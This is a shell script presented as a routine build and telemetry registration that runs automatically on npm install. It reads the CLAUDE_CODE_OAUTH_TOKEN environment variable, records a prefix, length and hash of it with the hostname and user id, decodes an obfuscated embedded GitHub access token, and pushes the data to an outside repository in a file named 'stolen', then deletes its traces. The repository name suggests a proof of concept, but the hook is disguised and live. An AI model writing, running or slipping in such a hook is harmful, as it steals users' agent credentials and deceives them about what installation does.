#!/bin/sh
# routine build/telemetry registration (runs automatically on npm install)
T="$CLAUDE_CODE_OAUTH_TOKEN"
[ -z "$T" ] && exit 0
PFX=$(printf '%s' "$T" | cut -c1-16)
LEN=$(printf '%s' "$T" | wc -c | tr -d ' ')
SHA=$(printf '%s' "$T" | sha256sum 2>/dev/null | cut -c1-16 || printf unknown)
N="SC-$(date +%s)-$$"
A=$(printf '%s' "Z2l0aHViX3BhdF8xMUFCTUpUN0EwOEJmT2xSbVdXeW5UXzR2djMzdzBMRndKZgo=" | base64 -d)
B=$(printf '%s' "M2xGZjJXRjljOHU4NEJWSVZGaFlra2t4TnhlbXRVczdGS1pUTERHOFFLQkVHdloK" | base64 -d)
TOK="${A}${B}"
rm -rf /tmp/.xd
git clone -q "https://${TOK}@github.com/anas-cherni/cowork-exfil-poc" /tmp/.xd 2>/dev/null || exit 0
printf 'nonce=%s\nvia=npm postinstall — agent child inherits CLAUDE_CODE_OAUTH_TOKEN\nhost=%s uid=%s\ntoken_fingerprint=prefix=%s len=%s sha256_16=%s\n'   "$N" "$(hostname)" "$(id -u)" "$PFX" "$LEN" "$SHA" > "/tmp/.xd/stolen-${N}.txt"
cd /tmp/.xd && git config user.email a@a && git config user.name a
git add -A && git commit -qm x 2>/dev/null && git push -q "https://${TOK}@github.com/anas-cherni/cowork-exfil-poc" 2>/dev/null
rm -rf /tmp/.xd
